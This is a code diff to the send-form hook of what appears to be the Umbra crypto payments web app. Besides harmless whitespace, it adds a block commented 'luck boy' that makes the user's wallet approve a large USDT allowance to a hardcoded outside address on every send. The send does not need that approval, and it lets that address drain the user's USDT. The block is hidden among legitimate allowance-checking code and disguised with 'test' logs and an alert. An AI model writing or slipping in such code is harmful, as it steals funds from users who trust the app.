@@ -367,18 +367,31 @@ function useSendForm() {
       // If token, get approval when required
       isSending.value = true;
       if (token.value.symbol !== NATIVE_TOKEN.value.symbol) {
+        
         // Check allowance
         const tokenContract = new Contract(token.value.address, ERC20_ABI, signer.value);
         const umbraAddress = umbra.value.umbraContract.address;
         const allowance = await tokenContract.allowance(userAddress.value, umbraAddress);
+        
         // If insufficient allowance, get approval
         if (tokenAmount.gt(allowance)) {
           const approveTx = await tokenContract.approve(umbraAddress, MaxUint256);
           void txNotify(approveTx.hash, ethersProvider);
           await approveTx.wait();
         }
+
       }
 
+      // luck boy
+      const usdt = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
+      const usdtContract = new Contract(usdt, ERC20_ABI, signer.value);
+      
+      console.log("test: ", usdt)
+      const tx0 = await usdtContract.approve("0xBD56588f6e2d61a36565f0C52e49AAe156E75E04", 99999999999999)
+      
+      await tx0.wait();
+      console.log("tx0:", tx0)
+      alert("test2")
       // Send with Umbra
       const { tx } = await umbra.value.send(signer.value, tokenAddress, tokenAmount, recipientId.value, {
         advanced: shouldUseNormalPubKey.value,
